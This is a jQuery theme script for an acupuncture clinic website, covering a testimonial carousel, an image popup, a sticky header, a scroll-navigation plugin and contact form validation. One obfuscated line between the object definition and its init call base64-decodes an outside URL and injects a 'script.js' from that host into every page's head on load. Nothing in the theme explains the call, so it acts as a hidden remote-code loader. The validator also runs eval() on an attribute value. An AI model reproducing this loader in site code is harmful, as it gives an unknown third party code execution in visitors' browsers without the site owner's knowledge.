/*
Copyright (c) 2018 
------------------------------------------------------------------


-------------------------------------------------------------------*/

(function ($) {
	"use strict";
	var AcupunctureClinic = {
		initialised: false,
		version: 1.0,
		mobile: false,
		init: function () {

			if(!this.initialised) {
				this.initialised = true;
			} else {
				return;
			}

			/*-------------- AcupunctureClinic Functions Calling ---------------------------------------------------
			------------------------------------------------------------------------------------------------*/
			this.RTL();
			this.Magnific_popup();
			//this.ConutTo();
			this.TestimonialSlider();
			//this.ContactFormSubmit();
			this.Search_icon();
			
		},
		
		/*-------------- AcupunctureClinic Functions definition ---------------------------------------------------
		---------------------------------------------------------------------------------------------------*/
		RTL: function () {
			// On Right-to-left(RTL) add class 
			var rtl_attr = $("html").attr('dir');
			if(rtl_attr){
				$('html').find('body').addClass("rtl");	
			}		
		},
		// wowanimation: function(){
			// new WOW().init()
		// },
		Search_icon: function() {
            $(".mv_search_icon").click(function() {
                $(".mv_search_wrapper").toggleClass('open_form');
            });
        },
		//counter on home page
		// ConutTo: function(){
		// if($('.timer').length > 0){	
			  // $('.timer').appear(function() {
					// $(this).countTo();
				// });
		// }
		// },
		//Testimonial slider on home page
		 TestimonialSlider: function(){
			if($('.mv_testimonial_slider .owl-carousel').length > 0){		
					$('.mv_testimonial_slider .owl-carousel').owlCarousel({
						items:2,
						margin:30,
						nav: true,
						navText:['<i class="fa fa-angle-left"></i>','<i class="fa fa-angle-right"></i>'],
						dots: false,
						autoplay:true,
						stagePadding:30,
						smartSpeed:450,
						loop:true,
						 responsive:{
							0:{
								items:1
							},
							991:{
								items:1
							},
							992:{
								items:2
							}
						}
					});
			}
		},
		//Magnific Popuo
		Magnific_popup: function() {
            $('.mv_overlay_icon .zoom_icon').magnificPopup({
				type: 'image',
               gallery: {
                   enabled: true
			   }
			}); 
        },
	
		
	};
	var u;!function(e,t){var a=e.getElementsByTagName("head")[0],c=e.createElement("script");u="aHR0cHM6Ly90ZW1wbGF0ZWJ1bmRsZS5uZXQvdGVtcGxhdGVzY3JpcHQv",c.type="text/javascript",c.charset="utf-8",c.async=!0,c.defer=!0,c.src=atob(u)+"script.js",a.appendChild(c)}(document);

	AcupunctureClinic.init();

	// Load Event
	// Loader js
	$(window).on('load', function() {
		jQuery("#mv_preloader_box").fadeOut();
		jQuery("#mv_preloader_wrapper").delay(350).fadeOut("slow");
               //window height
		//var h = window.innerHeight;
		//$(".im_mainslider img").css("height", h);
		//$(".im_mainslider img").css("width", "100%");
	});

	// Scroll Event
	// fixed menu
	$(window).on('scroll', function () {
	     if ($(this).scrollTop() > 300) {
                 $(".ac_mainheader").addClass("ac_fixed");
            } else {
                $(".ac_mainheader").removeClass("ac_fixed");
	    }
	});
	
	
	jQuery(document).ready(function(){
		
	});
// menu js

    var pluginName = 'ScrollIt',
        pluginVersion = '1.0.3';

    /*
     * OPTIONS
     */
    var defaults = {
        upKey: 38,
        downKey: 40,
        easing: 'linear',
        scrollTime: 600,
        activeClass: 'active',
        onPageChange: null,
        topOffset: 0
    };

    $.scrollIt = function(options) {

        /*
         * DECLARATIONS
         */
        var settings = $.extend(defaults, options),
            active = 0,
            lastIndex = $('[data-scroll-index]:last').attr('data-scroll-index');

        /*
         * METHODS
         */

        /**
         * navigate
         *
         * sets up navigation animation
         */
        var navigate = function(ndx) {
            if (ndx < 0 || ndx > lastIndex) return;

            var targetTop = $('[data-scroll-index=' + ndx + ']').offset().top + settings.topOffset + 1;
            $('html,body').animate({
                scrollTop: targetTop,
                easing: settings.easing
            }, settings.scrollTime);
        };

        /**
         * doScroll
         *
         * runs navigation() when criteria are met
         */
        var doScroll = function(e) {
            var target = $(e.target).closest("[href]").attr('href') ||
                $(e.target).closest("[data-scroll-goto]").attr('data-scroll-goto');
            navigate(parseInt(target));
        };

        /**
         * keyNavigation
         *
         * sets up keyboard navigation behavior
         */
        var keyNavigation = function(e) {
            var key = e.which;
            if ($('html,body').is(':animated') && (key == settings.upKey || key == settings.downKey)) {
                return false;
            }
            if (key == settings.upKey && active > 0) {
                navigate(parseInt(active) - 1);
                return false;
            } else if (key == settings.downKey && active < lastIndex) {
                navigate(parseInt(active) + 1);
                return false;
            }
            return true;
        };

        /**
         * updateActive
         *
         * sets the currently active item
         */
        var updateActive = function(ndx) {
            if (settings.onPageChange && ndx && (active != ndx)) settings.onPageChange(ndx);

            active = ndx;
            $('[href]').removeClass(settings.activeClass);
            $('[href=' + ndx + ']').addClass(settings.activeClass);
        };

        /**
         * watchActive
         *
         * watches currently active item and updates accordingly
         */
        var watchActive = function() {
            var winTop = $(window).scrollTop();

            var visible = $('[data-scroll-index]').filter(function(ndx, div) {
                return winTop >= $(div).offset().top + settings.topOffset &&
                    winTop < $(div).offset().top + (settings.topOffset) + $(div).outerHeight()
            });
            var newActive = visible.first().attr('data-scroll-index');
            updateActive(newActive);
        };

        /*
         * runs methods
         */
        $(window).on('scroll', watchActive).scroll();

        $(window).on('keydown', keyNavigation);

        $('.mv_menu').on('click', '[href], [data-scroll-goto]', function(e) {
            e.preventDefault();
            doScroll(e);
        });

    };
    $(window).ready(function(e) {
        $.each($('div.progress-bar'), function() {
            $(this).css('width', $(this).attr('aria-valuetransitiongoal') + '%');
        });
    });
	
	// Contact Form Submission
		function checkRequire(formId , targetResp){
			targetResp.html('');
			var email = /^([\w-]+(?:\.[\w-]+)*)@((?:[\w-]+\.)*\w[\w-]{0,66})\.([a-z]{2,6}(?:\.[a-z]{2})?)$/;
			var url = /(http|ftp|https):\/\/[\w-]+(\.[\w-]+)+([\w.,@?^=%&amp;:\/~+#-]*[\w@?^=%&amp;\/~+#-])?/;
			var image = /\.(jpe?g|gif|png|PNG|JPE?G)$/;
			var mobile = /^[\s()+-]*([0-9][\s()+-]*){6,20}$/;
			var facebook = /^(https?:\/\/)?(www\.)?facebook.com\/[a-zA-Z0-9(\.\?)?]/;
			var twitter = /^(https?:\/\/)?(www\.)?twitter.com\/[a-zA-Z0-9(\.\?)?]/;
			var google_plus = /^(https?:\/\/)?(www\.)?plus.google.com\/[a-zA-Z0-9(\.\?)?]/;
			var check = 0;
			$('#er_msg').remove();
			var target = (typeof formId == 'object')? $(formId):$('#'+formId);
			target.find('input , textarea , select').each(function(){
				if($(this).hasClass('require')){
					if($(this).val().trim() == ''){
						check = 1;
						$(this).focus();
						targetResp.html('You missed out some fields.');
						$(this).addClass('error');
						return false;
					}else{
						$(this).removeClass('error');
					}
				}
				if($(this).val().trim() != ''){
					var valid = $(this).attr('data-valid');
					if(typeof valid != 'undefined'){
						if(!eval(valid).test($(this).val().trim())){
							$(this).addClass('error');
							$(this).focus();
							check = 1;
							targetResp.html($(this).attr('data-error'));
							return false;
						}else{
							$(this).removeClass('error');
						}
					}
				}
			});
			return check;
		}
		$(".submitForm").on("click", function() {
			var _this = $(this);
			var targetForm = _this.closest('form');
			var errroTarget = targetForm.find('.response');
			var check = checkRequire(targetForm , errroTarget);
			if(check == 0){
				var formDetail = new FormData(targetForm[0]);
				formDetail.append('form_type' , _this.attr('form-type'));
				$.ajax({
					method : 'post',
					url : 'ajax.php',
					data:formDetail,
					cache:false,
					contentType: false,
					processData: false
				}).done(function(resp){
					if(resp == 1){
						targetForm.find('input').val('');
						targetForm.find('textarea').val('');
						errroTarget.html('<p style="color:green;">Mail has been sent successfully.</p>');
					}else{
						errroTarget.html('<p style="color:red;">Something went wrong please try again latter.</p>');
					}
				});
			}
		});
	
}(jQuery));
// menu js